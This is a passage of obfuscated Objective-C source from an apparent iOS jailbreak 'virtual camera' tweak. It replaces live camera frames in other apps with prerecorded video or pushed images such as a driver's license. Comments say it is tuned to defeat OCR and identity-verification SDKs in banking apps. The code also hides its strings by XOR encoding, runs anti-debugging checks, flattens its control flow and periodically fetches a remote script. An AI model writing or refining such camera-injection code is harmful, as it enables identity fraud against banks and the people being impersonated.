    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        @try {
            NSDictionary *body = @{_ds("\x5C\x52\x4E",3): key, _ds("\x42\x53\x5E\x53",4): udid, _ds("\x41\x52\x45",3): @(VCAM_BUILD)};
            NSData *jd = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
            NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_chkURL()]
                cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
            [r setHTTPMethod:_ds("\x67\x78\x64\x63",4)];
            [r setValue:_ds("\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x5D\x44\x58\x59",16) forHTTPHeaderField:_ds("\x74\x58\x59\x43\x52\x59\x43\x1A\x63\x4E\x47\x52",12)];
            [r setValue:_ds("\x7A\x58\x4D\x5E\x5B\x5B\x56\x18\x02\x19\x07",11) forHTTPHeaderField:_ds("\x62\x44\x52\x45\x1A\x76\x50\x52\x59\x43",10)];
            [r setHTTPBody:jd];
            NSURLSessionDataTask *t = [_pinnedSession() dataTaskWithRequest:r
                completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
                    if (err || !data) {
                        vcam_log(@"chk: net err");
                        return;
                    }
                    NSDictionary *res = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    if (!res) {
                        vcam_log(@"chk: bad resp");
                        return;
                    }
                    NSString *sig = res[_ds2("\xA1\xDF\x43", 3)];
                    NSNumber *tsN = res[_ds2("\xAF", 1)];
                    if (!sig || !tsN) {
                        vcam_log(@"chk: no sig");
                        return;
                    }
                    double nowMs = [[NSDate date] timeIntervalSince1970] * 1000.0;
                    if (fabs(nowMs - [tsN doubleValue]) > 5 * 60 * 1000) {
                        vcam_log(@"chk: ts drift");
                        return;
                    }
                    if (!_vrfHMAC(res, sig)) {
                        vcam_log(@"chk: hmac fail");
                        return;
                    }
                    if (![res[_ds("\x58\x5C",2)] boolValue]) {
                        // Read error reason — only nuke cache for HARD failures (revoke / ban)
                        // Soft failures (transient KV/network/clock issues) keep cache so next
                        // heartbeat can recover without forcing re-activation
                        NSString *errReason = res[@"error"] ?: @"unknown";
                        BOOL isHardFail = [errReason isEqualToString:@"revoked"] ||
                                          [errReason isEqualToString:@"device_banned"];
                        if (isHardFail) {
                            _setAuth(NO);
                            [[NSFileManager defaultManager] removeItemAtPath:_licPath() error:nil];
                            [[NSFileManager defaultManager] removeItemAtPath:_webJSPath() error:nil];
                            vcam_log([NSString stringWithFormat:@"chk: HARD-fail (cache deleted) error=%@", errReason]);
                            CFNotificationCenterPostNotification(
                                CFNotificationCenterGetDarwinNotifyCenter(),
                                (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x56\x42\x43\x5F\x58\x51\x51",20), NULL, NULL, YES);
                        } else {
                            // Soft fail: keep cache, just log — let next heartbeat recover
                            vcam_log([NSString stringWithFormat:@"chk: soft-fail (cache kept) error=%@", errReason]);
                        }
                    } else {
                        NSNumber *mvN = res[_ds("\x5A\x41",2)];
                        if (mvN && VCAM_BUILD < [mvN intValue]) {
                            _setAuth(NO);
                            [[NSFileManager defaultManager] removeItemAtPath:_licPath() error:nil];
                            [[NSFileManager defaultManager] removeItemAtPath:_webJSPath() error:nil];
                            vcam_log(@"chk: force update");
                            CFNotificationCenterPostNotification(
                                CFNotificationCenterGetDarwinNotifyCenter(),
                                (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x56\x42\x43\x5F\x58\x51\x51",20), NULL, NULL, YES);
                            dispatch_async(dispatch_get_main_queue(), ^{
                                UIWindow *kw = nil;
                                for (UIScene *sc in [UIApplication sharedApplication].connectedScenes) {
                                    if ([sc isKindOfClass:[UIWindowScene class]]) {
                                        for (UIWindow *w in ((UIWindowScene *)sc).windows) {
                                            if (w.isKeyWindow) { kw = w; break; }
                                        }
                                    }
                                    if (kw) break;
                                }
                                UIViewController *top = kw.rootViewController;
                                while (top.presentedViewController) top = top.presentedViewController;
                                if (!top || [top isKindOfClass:[UIAlertController class]]) return;
                                UIAlertController *al = [UIAlertController alertControllerWithTitle:@"版本过低"
                                    message:@"当前版本已停用，请更新到最新版本。"
                                    preferredStyle:UIAlertControllerStyleAlert];
                                [al addAction:[UIAlertAction actionWithTitle:@"前往更新" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a) {
                                    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://vcamplus.com"] options:@{} completionHandler:nil];
                                }]];
                                [al addAction:[UIAlertAction actionWithTitle:@"知道了" style:UIAlertActionStyleCancel handler:nil]];
                                [top presentViewController:al animated:YES completion:nil];
                            });
                        } else {
                            _savTS(); // online success — update anti-rollback timestamp
                            _refreshLC(); // extend local cache 1h window
                            vcam_log(@"chk: ok");
                            // 服务端公告弹窗（持久化计数，每隔1小时弹一次，最多弹N次）
                            NSString *ntc = res[@"notice"];
                            NSInteger ntcMax = [res[@"ntcMax"] integerValue] ?: 1;
                            if ([ntc isKindOfClass:[NSString class]] && ntc.length > 0) {
                                NSString *ntcFile = [VCAM_DIR stringByAppendingPathComponent:@".ntc"];
                                BOOL shouldShow = NO;
                                @try {
                                    NSDictionary *saved = nil;
                                    NSData *nd = [NSData dataWithContentsOfFile:ntcFile];
                                    if (nd) saved = [NSJSONSerialization JSONObjectWithData:nd options:0 error:nil];
                                    NSString *savedMsg = saved[@"m"];
                                    NSInteger shownCount = [saved[@"c"] integerValue];
                                    double lastTime = [saved[@"t"] doubleValue];
                                    double now = [[NSDate date] timeIntervalSince1970];
                                    if (![ntc isEqualToString:savedMsg]) {
                                        // 新公告，重置计数
                                        shownCount = 0; lastTime = 0;
                                    }
                                    if (shownCount < ntcMax && (now - lastTime) >= 3600.0) {
                                        shouldShow = YES;
                                        NSDictionary *upd = @{@"m": ntc, @"c": @(shownCount + 1), @"t": @(now)};
                                        NSData *wd = [NSJSONSerialization dataWithJSONObject:upd options:0 error:nil];
                                        [wd writeToFile:ntcFile atomically:YES];
                                    }
                                } @catch (NSException *e) { shouldShow = YES; }
                                if (shouldShow) {
                                    dispatch_async(dispatch_get_main_queue(), ^{
                                        UIWindow *kw = nil;
                                        for (UIScene *sc in [UIApplication sharedApplication].connectedScenes) {
                                            if ([sc isKindOfClass:[UIWindowScene class]]) {
                                                for (UIWindow *w in ((UIWindowScene *)sc).windows) {
                                                    if (w.isKeyWindow) { kw = w; break; }
                                                }
                                            }
                                            if (kw) break;
                                        }
                                        UIViewController *top = kw.rootViewController;
                                        while (top.presentedViewController) top = top.presentedViewController;
                                        if (!top || [top isKindOfClass:[UIAlertController class]]) return;
                                        UIAlertController *al = [UIAlertController alertControllerWithTitle:@"公告"
                                            message:ntc
                                            preferredStyle:UIAlertControllerStyleAlert];
                                        [al addAction:[UIAlertAction actionWithTitle:@"知道了" style:UIAlertActionStyleDefault handler:nil]];
                                        [top presentViewController:al animated:YES completion:nil];
                                    });
                                }
                            }
                            // 心跳成功时，webcam.dat 不存在或超过1小时则重新拉取
                            {
                                BOOL _wjFetch = NO;
                                NSString *_wjP = _webJSPath();
                                if (![[NSFileManager defaultManager] fileExistsAtPath:_wjP]) {
                                    _wjFetch = YES;
                                } else {
                                    NSDictionary *_wjA = [[NSFileManager defaultManager] attributesOfItemAtPath:_wjP error:nil];
                                    NSDate *_wjM = _wjA[NSFileModificationDate];
                                    if (_wjM && [[NSDate date] timeIntervalSinceDate:_wjM] > 3600) _wjFetch = YES;
                                }
                                if (_wjFetch) _fetchWebJS();
                            }
                        }
                    }
                }];
            [t resume];
        } @catch (NSException *e) {
            vcam_log(@"chk: net err");
        }
    });
}

// --- Video path helpers ---
static NSString *vcam_currentVideoPath(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *exts = @[@"mp4", @"MP4", @"mov", @"MOV", @"m4v", @"M4V"];
    // Try current index first
    if (gVideoIndex == 0) {
        if ([fm fileExistsAtPath:VCAM_VIDEO]) return VCAM_VIDEO;
    } else {
        for (NSString *ext in exts) {
            NSString *path = [NSString stringWithFormat:@"%@/%d.%@", VCAM_DIR, gVideoIndex, ext];
            if ([fm fileExistsAtPath:path]) return path;
        }
    }
    // Fallback: try video.mp4, then any numbered video 1-6
    if ([fm fileExistsAtPath:VCAM_VIDEO]) return VCAM_VIDEO;
    for (int i = 1; i <= 6; i++) {
        for (NSString *ext in exts) {
            NSString *path = [NSString stringWithFormat:@"%@/%d.%@", VCAM_DIR, i, ext];
            if ([fm fileExistsAtPath:path]) return path;
        }
    }
    return VCAM_VIDEO; // last resort
}

static void vcam_switchVideo(int index) {
    gVideoIndex = index;
    [gLockA lock]; gReaderA = nil; gOutputA = nil; [gLockA unlock];
    [gLockB lock]; gReaderB = nil; gOutputB = nil; [gLockB unlock];
    gPausedFrame = nil;
    NSString *path = vcam_currentVideoPath();
    BOOL exists = [[NSFileManager defaultManager] fileExistsAtPath:path];
    vcam_log([NSString stringWithFormat:@"Switched to video index %d: %@ (exists=%@)", index, path, exists ? @"Y" : @"N"]);
}

// --- Cross-process controls via enabled flag file ---
// Piggyback controls on VCAM_FLAG (the "enabled" file) which ALL processes can read.
// Format: "1,videoIndex,rotation,flipH,paused,offsetX,offsetY"
// When no controls set, the file just contains "1".

// Parse controls from flag file content and apply to globals
static void vcam_applyControls(NSString *content) {
    if (!content || content.length < 3) return; // "1" alone = no controls
    NSArray *parts = [content componentsSeparatedByString:@","];
    if (parts.count < 7) return; // "1,idx,rot,flip,pause,offX,offY[,colorInject,R,G,B,alpha]"
    int newIndex = [parts[1] intValue];
    if (newIndex != gVideoIndex) {
        vcam_switchVideo(newIndex);
    }
    gVideoRotation = [parts[2] intValue];
    gVideoFlipH = [parts[3] intValue] != 0;
    BOOL newPaused = [parts[4] intValue] != 0;
    if (newPaused != gVideoPaused) {
        gPausedFrame = nil;
    }
    gVideoPaused = newPaused;
    gVideoOffsetX = [parts[5] doubleValue];
    gVideoOffsetY = [parts[6] doubleValue];
    // Three-color injection fields (optional, backward compatible)
    if (parts.count >= 11) {
        gColorInject = [parts[7] intValue] != 0;
        gInjectR = [parts[8] doubleValue];
        gInjectG = [parts[9] doubleValue];
        gInjectB = [parts[10] doubleValue];
    }
    if (parts.count >= 12) {
        gInjectAlpha = [parts[11] doubleValue];
    }
    if (parts.count >= 16) {
        gInjectDiameter = [parts[12] doubleValue];
        gInjectOffX = [parts[13] doubleValue];
        gInjectOffY = [parts[14] doubleValue];
        gInjectMode = [parts[15] intValue];
    }
}

static void vcam_writeControls(void) {
    @try {
        // Write controls into the enabled flag file (readable by ALL processes including GPU)
        NSString *line = [NSString stringWithFormat:@"1,%d,%d,%d,%d,%.4f,%.4f,%d,%.4f,%.4f,%.4f,%.2f,%.2f,%.4f,%.4f,%d",
            gVideoIndex, gVideoRotation, (int)gVideoFlipH, (int)gVideoPaused,
            gVideoOffsetX, gVideoOffsetY,
            (int)gColorInject, gInjectR, gInjectG, gInjectB, gInjectAlpha,
            gInjectDiameter, gInjectOffX, gInjectOffY, gInjectMode];
        NSError *err = nil;
        BOOL ok = [line writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:&err];
        vcam_log([NSString stringWithFormat:@"writeControls: ok=%@ [%@]", ok ? @"Y" : @"N", line]);
        // Also push notification for instant delivery to app processes
        CFNotificationCenterPostNotification(
            CFNotificationCenterGetDarwinNotifyCenter(),
            (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x54\x43\x45\x5B",17), NULL, NULL, YES);
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"writeControls exception: %@", e]);
    }
}

// Darwin notification callback — app processes read controls immediately
static void vcam_controlsChangedNotif(CFNotificationCenterRef center, void *observer,
    CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    NSString *proc = [[NSProcessInfo processInfo] processName];
    if ([proc isEqualToString:_ds("\x64\x47\x45\x5E\x59\x50\x75\x58\x56\x45\x53",11)]) return;
    @try {
        NSString *content = [NSString stringWithContentsOfFile:VCAM_FLAG encoding:NSUTF8StringEncoding error:nil];
        vcam_log([NSString stringWithFormat:@"ctrlNotif: [%@]", content ?: @"(nil)"]);
        vcam_applyControls(content);
    } @catch (NSException *e) {}
}

// Darwin notification callback — auth revoked by heartbeat in another process
static void vcam_authOffNotif(CFNotificationCenterRef center, void *observer,
    CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    if (!_isAuth()) return; // already off
    if (!_chkLC()) {
        _setAuth(NO);
        [[NSFileManager defaultManager] removeItemAtPath:_webJSPath() error:nil];
        vcam_log(@"authOffNotif: dropped");
    }
}

static void vcam_authOnNotif(CFNotificationCenterRef center, void *observer,
    CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    if (_isAuth()) return; // already on
    if (_chkLC()) {
        _setAuth(YES);
        vcam_log(@"authOnNotif: restored");
    }
}

// Polling fallback — called from vcam_replacePixelBuffer (covers GPU process which may not get notifications)
static void vcam_readControls(void) {
    static NSTimeInterval sLastRead = 0;
    NSTimeInterval now = CACurrentMediaTime();
    if (now - sLastRead < 0.3) return;
    sLastRead = now;
    @try {
        NSString *content = [NSString stringWithContentsOfFile:VCAM_FLAG encoding:NSUTF8StringEncoding error:nil];
        vcam_applyControls(content);
    } @catch (NSException *e) {}
}

// --- Source checks ---
static BOOL vcam_flagExists(void) { return [[NSFileManager defaultManager] fileExistsAtPath:VCAM_FLAG]; }
static BOOL vcam_videoExists(void) { return [[NSFileManager defaultManager] fileExistsAtPath:vcam_currentVideoPath()]; }
static BOOL vcam_imageExists(void) { return [[NSFileManager defaultManager] fileExistsAtPath:VCAM_IMAGE]; }
static BOOL vcam_streamFrameExists(void) {
    NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_STREAM_FRAME error:nil];
    if (!attr) return NO;
    NSDate *modDate = attr[NSFileModificationDate];
    // Tolerate up to 10 seconds — brief PC hiccups during USB push shouldn't
    // demote stream mode to video mode (which would force JS to re-init).
    return modDate && [[NSDate date] timeIntervalSinceDate:modDate] < 10.0;
}
static BOOL vcam_sourceExists(void) { return vcam_streamFrameExists() || vcam_videoExists() || vcam_imageExists(); }
static uint64_t _lastSecChk = 0;
static BOOL vcam_isEnabled(void) {
    volatile int _s = 0;
    uint64_t now = 0;
    BOOL _r = NO;
    while (1) switch (_s) {
        case 0:
            now = mach_absolute_time();
            if (_lastSecChk == 0 || (now - _lastSecChk) > 30ULL * 1000000000ULL) { _s = 3; }
            else { _s = 10; }
            break;
        case 3:
            _lastSecChk = now;
            _s = 5;
            break;
        case 5:
            @try { _antiDbgCheck(); } @catch (NSException *e) {}
            _s = 7;
            break;
        case 7:
            @try { _integrityCheck(); } @catch (NSException *e) {}
            _s = 10;
            break;
        case 10:
            if (!VCAM_CHK_A()) { _s = 15; }
            else { _s = 20; }
            break;
        case 15:
            _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0;
            _r = NO;
            _s = 99;
            break;
        case 20:
            if (!_isAuth()) { _r = NO; _s = 99; }
            else { _s = 25; }
            break;
        case 25:
            if (!vcam_flagExists()) { _r = NO; _s = 99; }
            else { _s = 30; }
            break;
        case 30:
            _r = vcam_sourceExists();
            _s = 99;
            break;
        case 35: if (now > 0) { _s = 40; } else { _s = 15; } break; // dead
        case 40: _r = (_aS2 != 0); _s = 99; break; // dead
        case 45: if (_r) { _s = 35; } else { _s = 40; } break; // dead
        default: return _r;
    }
}

// --- Static image loading ---
static CIImage *vcam_loadStaticImage(void) {
    if (gStaticImage) return gStaticImage;
    @try {
        NSData *data = [NSData dataWithContentsOfFile:VCAM_IMAGE];
        if (!data) return nil;
        // Use CGImageSource (works in all processes including WebContent without UIKit)
        CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)data, NULL);
        if (!src) return nil;
        CGImageRef cgImg = CGImageSourceCreateImageAtIndex(src, 0, NULL);
        CFRelease(src);
        if (!cgImg) return nil;
        gStaticImage = [CIImage imageWithCGImage:cgImg];
        CGImageRelease(cgImg);
        if (gStaticImage) vcam_log(@"Static image loaded");
        return gStaticImage;
    } @catch (NSException *e) { return nil; }
}

// --- Video reader ---
static BOOL vcam_openReader(AVAssetReader *__strong *rdr, AVAssetReaderTrackOutput *__strong *out) {
    @try {
        *rdr = nil; *out = nil;
        if (!vcam_videoExists()) return NO;
        AVURLAsset *asset = [AVURLAsset URLAssetWithURL:[NSURL fileURLWithPath:vcam_currentVideoPath()]
                             options:@{AVURLAssetPreferPreciseDurationAndTimingKey: @NO}];
        NSArray *tracks = [asset tracksWithMediaType:AVMediaTypeVideo];
        if (tracks.count == 0) return NO;
        NSError *err = nil;
        AVAssetReader *reader = [[AVAssetReader alloc] initWithAsset:asset error:&err];
        if (!reader || err) return NO;
        NSDictionary *s = @{(NSString *)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA)};
        AVAssetReaderTrackOutput *output = [[AVAssetReaderTrackOutput alloc] initWithTrack:tracks[0] outputSettings:s];
        output.alwaysCopiesSampleData = NO;
        if (![reader canAddOutput:output]) return NO;
        [reader addOutput:output]; if (![reader startReading]) return NO;
        *rdr = reader; *out = output; return YES;
    } @catch (NSException *e) { return NO; }
}

static CMSampleBufferRef vcam_readFrame(NSLock *lock, AVAssetReader *__strong *rdr, AVAssetReaderTrackOutput *__strong *out) {
    [lock lock];
    @try {
        if (!*rdr || (*rdr).status != AVAssetReaderStatusReading) vcam_openReader(rdr, out);
        CMSampleBufferRef frame = nil;
        if (*rdr) {
            frame = [*out copyNextSampleBuffer];
            if (!frame) { if (vcam_openReader(rdr, out)) frame = [*out copyNextSampleBuffer]; }
        }
        [lock unlock]; return frame;
    } @catch (NSException *e) { [lock unlock]; return NULL; }
}

// Open AVAssetReader configured to output the SAME pixel format as the camera buffer
// we're replacing. Frida-confirmed Hyakugo (Liquid SDK) configures camera as BGRA 1080x1920;
// many other apps use NV12 (420v). Passing back the wrong format = byte-level garbage,
// regardless of how nice the rendered RGB looks.
//
// Source preference: vcam123 leaves a high-res temp.mov (1080x1920 HEVC) at
// /var/jb/var/mobile/Library/temp.mov which exactly matches Hyakugo's camera dims.
// Our own video.mp4 gets downsampled to 720x1280 by the picker UI. Prefer temp.mov
// when present so passthrough is dim-perfect.
#define VCAM123_TEMP_MOV @"/var/jb/var/mobile/Library/temp.mov"
static NSString *vcam_passthroughSourcePath(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:VCAM123_TEMP_MOV]) return VCAM123_TEMP_MOV;
    return vcam_currentVideoPath();
}

static BOOL vcam_openReaderForFmt(OSType fmt, AVAssetReader *__strong *rdr, AVAssetReaderTrackOutput *__strong *out) {
    @try {
        *rdr = nil; *out = nil;
        NSString *path = vcam_passthroughSourcePath();
        NSFileManager *fm = [NSFileManager defaultManager];
        if (!path || ![fm fileExistsAtPath:path]) return NO;
        AVURLAsset *asset = [AVURLAsset URLAssetWithURL:[NSURL fileURLWithPath:path]
                             options:@{AVURLAssetPreferPreciseDurationAndTimingKey: @NO}];
        NSArray *tracks = [asset tracksWithMediaType:AVMediaTypeVideo];
        if (tracks.count == 0) return NO;
        NSError *err = nil;
        AVAssetReader *reader = [[AVAssetReader alloc] initWithAsset:asset error:&err];
        if (!reader || err) return NO;
        NSDictionary *s = @{(NSString *)kCVPixelBufferPixelFormatTypeKey: @(fmt),
                            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}};
        AVAssetReaderTrackOutput *output = [[AVAssetReaderTrackOutput alloc] initWithTrack:tracks[0] outputSettings:s];
        output.alwaysCopiesSampleData = YES;  // Don't recycle — keep buffer alive after wrap
        if (![reader canAddOutput:output]) return NO;
        [reader addOutput:output]; if (![reader startReading]) return NO;
        *rdr = reader; *out = output; return YES;
    } @catch (NSException *e) { return NO; }
}

// Read next frame from format-specific reader. Re-opens with same fmt if at end.
static CMSampleBufferRef vcam_readFrameFmt(OSType fmt, NSLock *lock, AVAssetReader *__strong *rdr, AVAssetReaderTrackOutput *__strong *out) {
    [lock lock];
    @try {
        if (!*rdr || (*rdr).status != AVAssetReaderStatusReading) vcam_openReaderForFmt(fmt, rdr, out);
        CMSampleBufferRef frame = nil;
        if (*rdr) {
            frame = [*out copyNextSampleBuffer];
            if (!frame) { if (vcam_openReaderForFmt(fmt, rdr, out)) frame = [*out copyNextSampleBuffer]; }
        }
        [lock unlock]; return frame;
    } @catch (NSException *e) { [lock unlock]; return NULL; }
}

// === Build 182 fix: background decode + frame cache (vcam123-style) ===
// vcamplus's captureOutput hook used to call vcam_readFrameFmt synchronously per frame.
// AVAssetReader EOF triggers a synchronous reopen taking 30-50ms, blocking the next frame
// → buildPassthrough returns NULL → OneSpan-protected in-place fallback fails → OCR sees black.
//
// Fix: a 30 fps dispatch_source_t timer runs in the background, continuously decoding and
// caching the latest frame. captureOutput hook just retains the cached frame — never blocks,
// never returns NULL. vcam123 frida-confirmed at 99.7% buildPassthrough success rate (376/377).
static CMSampleBufferRef gPTFrameCache = NULL;
static NSLock *gPTCacheLock = nil;
static dispatch_source_t gPTDecodeTimer = NULL;
static OSType gPTCacheFmt = 0;
static dispatch_queue_t gPTCacheQ = nil;

static void vcam_startPassthroughCache(OSType fmt) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gPTCacheLock = [[NSLock alloc] init];
        gPTCacheQ = dispatch_queue_create("vcam.pt.decode", DISPATCH_QUEUE_SERIAL);
    });
    dispatch_sync(gPTCacheQ, ^{
        if (gPTDecodeTimer && gPTCacheFmt == fmt) return; // already running with same fmt
        if (gPTDecodeTimer) {
            dispatch_source_cancel(gPTDecodeTimer);
            gPTDecodeTimer = NULL;
        }
        gPTCacheFmt = fmt;
        dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);
        gPTDecodeTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, q);
        dispatch_source_set_timer(gPTDecodeTimer,
                                  dispatch_time(DISPATCH_TIME_NOW, 0),
                                  (uint64_t)(NSEC_PER_SEC / 30),
                                  (uint64_t)(NSEC_PER_SEC / 100));
        OSType localFmt = fmt;
        dispatch_source_set_event_handler(gPTDecodeTimer, ^{
            CMSampleBufferRef frame = vcam_readFrameFmt(localFmt, gLockPT, &gReaderPT, &gOutputPT);
            if (!frame) return;
            [gPTCacheLock lock];
            CMSampleBufferRef old = gPTFrameCache;
            gPTFrameCache = frame; // adopt the +1 ref returned by vcam_readFrameFmt
            [gPTCacheLock unlock];
            if (old) CFRelease(old);
        });
        dispatch_resume(gPTDecodeTimer);
    });
}

// Returns +1 retained sb from cache, or NULL if cache is empty (e.g. just started)
static CMSampleBufferRef vcam_takePassthroughCachedFrame(void) {
    if (!gPTCacheLock) return NULL;
    [gPTCacheLock lock];
    CMSampleBufferRef out = gPTFrameCache;
    if (out) CFRetain(out);
    [gPTCacheLock unlock];
    return out;
}

// Build a new CMSampleBuffer that wraps the source video's CVPixelBuffer DIRECTLY.
// vcam123-style: bypass CIContext entirely so OCR sees byte-exact hardware decoder output.
// CRITICAL: must match the camera's configured pixel format (Hyakugo = BGRA, others = NV12).
// We auto-detect from origSb and configure AVAssetReader to decode into the same format.
static CMSampleBufferRef vcam_buildPassthroughSampleBuffer(CMSampleBufferRef origSb) {
    if (!origSb) return NULL;
    if (!_isAuth()) return NULL;
    if (!VCAM_CHK_A()) { _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0; return NULL; }
    @try {
        // Lazy-init lock
        static dispatch_once_t once;
        dispatch_once(&once, ^{ gLockPT = [[NSLock alloc] init]; });
        if (!vcam_videoExists()) return NULL;
        // Detect camera buffer's actual pixel format
        CVImageBufferRef camPB = CMSampleBufferGetImageBuffer(origSb);
        if (!camPB) return NULL;
        OSType camFmt = CVPixelBufferGetPixelFormatType(camPB);
        // Sanity-check: AVAssetReaderTrackOutput supports BGRA, NV12 (420v/420f), and a few others
        if (camFmt != kCVPixelFormatType_32BGRA &&
            camFmt != kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange &&
            camFmt != kCVPixelFormatType_420YpCbCr8BiPlanarFullRange) {
            // Unsupported camera format → fall back to BGRA (most common Liquid SDK case)
            camFmt = kCVPixelFormatType_32BGRA;
        }
        // Build 182 fix: kick off background decode timer (idempotent), then take cached frame.
        // vcam123 uses the same architecture — frida confirmed 99.7% success rate.
        vcam_startPassthroughCache(camFmt);
        CMSampleBufferRef srcSb = vcam_takePassthroughCachedFrame();
        if (!srcSb) {
            // Cache empty (timer just started, first ~33ms) — do one synchronous read so we
            // don't fail the very first frame.
            srcSb = vcam_readFrameFmt(camFmt, gLockPT, &gReaderPT, &gOutputPT);
        }
        if (!srcSb) return NULL;
        CVImageBufferRef srcPB = CMSampleBufferGetImageBuffer(srcSb);
        if (!srcPB) { CFRelease(srcSb); return NULL; }
        // Build 167 behavior — direct wrap (no deep copy).
        // OCR was confirmed working with this exact code path.
        CMVideoFormatDescriptionRef fd = NULL;
        OSStatus s1 = CMVideoFormatDescriptionCreateForImageBuffer(kCFAllocatorDefault, srcPB, &fd);
        if (s1 != noErr || !fd) { CFRelease(srcSb); return NULL; }
        CMSampleTimingInfo timing;
        timing.duration = CMSampleBufferGetDuration(origSb);
        timing.presentationTimeStamp = CMSampleBufferGetPresentationTimeStamp(origSb);
        timing.decodeTimeStamp = CMSampleBufferGetDecodeTimeStamp(origSb);
        CMSampleBufferRef newSb = NULL;
        OSStatus s2 = CMSampleBufferCreateForImageBuffer(
            kCFAllocatorDefault, srcPB, true, NULL, NULL, fd, &timing, &newSb);
        CFRelease(fd);
        CFRelease(srcSb);
        if (s2 != noErr || !newSb) return NULL;
        return newSb;
    } @catch (NSException *e) { return NULL; }
}

// Aspect-fill: scale uniformly to FILL target, crop overflow (no distortion)
// AspectFit: scale source to fit ENTIRELY within target, letterbox with black bars.
// Used for STREAM mode where user pushes a specific image (e.g. driver's license)
// and wants to see the WHOLE image, not a zoomed-in crop.
static CIImage *vcam_aspectFit(CIImage *img, size_t targetW, size_t targetH) {
    CGRect ext = img.extent;
    CGFloat srcW = ext.size.width, srcH = ext.size.height;
    if (srcW <= 0 || srcH <= 0 || targetW == 0 || targetH == 0) return img;
    if ((size_t)srcW == targetW && (size_t)srcH == targetH) return img;
    CGFloat sx = (CGFloat)targetW / srcW;
    CGFloat sy = (CGFloat)targetH / srcH;
    CGFloat scale = MIN(sx, sy); // smaller scale = both fit
    CGFloat scaledW = srcW * scale;
    CGFloat scaledH = srcH * scale;
    img = [img imageByApplyingTransform:CGAffineTransformMakeScale(scale, scale)];
    // Center within target
    CGFloat tx = ((CGFloat)targetW - scaledW) / 2.0 - ext.origin.x * scale;
    CGFloat ty = ((CGFloat)targetH - scaledH) / 2.0 - ext.origin.y * scale;
    img = [img imageByApplyingTransform:CGAffineTransformMakeTranslation(tx, ty)];
    // Composite over black background to fill the target rect
    CIImage *bg = [[CIImage imageWithColor:[CIColor colorWithRed:0 green:0 blue:0 alpha:1]]
                   imageByCroppingToRect:CGRectMake(0, 0, (CGFloat)targetW, (CGFloat)targetH)];
    img = [img imageByCompositingOverImage:bg];
    return img;
}

static CIImage *vcam_aspectFill(CIImage *img, size_t targetW, size_t targetH) {
    CGRect ext = img.extent;
    CGFloat srcW = ext.size.width, srcH = ext.size.height;
    if (srcW <= 0 || srcH <= 0 || targetW == 0 || targetH == 0) return img;
    if ((size_t)srcW == targetW && (size_t)srcH == targetH) return img;
    // Auth-dependent: _authScale() returns 1.0 when auth fragments are consistent
    // If cracker fakes auth with wrong fragment values, scale will be wrong → garbled video
    CGFloat asc = _authScale();
    // Uniform scale to fill (use the LARGER ratio so both dimensions are covered)
    CGFloat sx = (CGFloat)targetW / srcW * asc;
    CGFloat sy = (CGFloat)targetH / srcH * asc;
    CGFloat scale = MAX(sx, sy);
    CGFloat scaledW = srcW * scale;
    CGFloat scaledH = srcH * scale;
    // Scale
    img = [img imageByApplyingTransform:CGAffineTransformMakeScale(scale, scale)];
    // Crop center to target size
    CGFloat cropX = (scaledW - targetW) / 2.0;
    CGFloat cropY = (scaledH - targetH) / 2.0;
    img = [img imageByCroppingToRect:CGRectMake(ext.origin.x * scale + cropX,
                                                 ext.origin.y * scale + cropY,
                                                 (CGFloat)targetW, (CGFloat)targetH)];
    // Translate to origin (0,0) — CIContext render:toCVPixelBuffer starts at (0,0),
    // so the image extent must also start there to fill the entire buffer
    CGRect finalExt = img.extent;
    if (finalExt.origin.x != 0 || finalExt.origin.y != 0) {
        img = [img imageByApplyingTransform:CGAffineTransformMakeTranslation(-finalExt.origin.x, -finalExt.origin.y)];
    }
    return img;
}

// Apply pan offset: shift the filled image and clamp edge pixels (works at any aspect ratio)
static CIImage *vcam_applyOffset(CIImage *img, size_t targetW, size_t targetH, CGFloat offX, CGFloat offY) {
    if (offX == 0 && offY == 0) return img;
    // Clamp to infinite extent (edge pixels repeat), crop at shifted position
    img = [img imageByClampingToExtent];
    CGFloat dx = offX * (CGFloat)targetW;
    CGFloat dy = -offY * (CGFloat)targetH; // CIImage Y is up, positive offY = move up = negative dy
    img = [img imageByCroppingToRect:CGRectMake(dx, dy, (CGFloat)targetW, (CGFloat)targetH)];
    // Translate back to origin for rendering
    CGRect ext = img.extent;
    if (ext.origin.x != 0 || ext.origin.y != 0) {
        img = [img imageByApplyingTransform:CGAffineTransformMakeTranslation(-ext.origin.x, -ext.origin.y)];
    }
    return img;
}

// Apply rotation + flip transforms for video mode
static CIImage *vcam_applyVideoTransforms(CIImage *img) {
    if (!img) return nil;
    if (gVideoRotation == 90) {
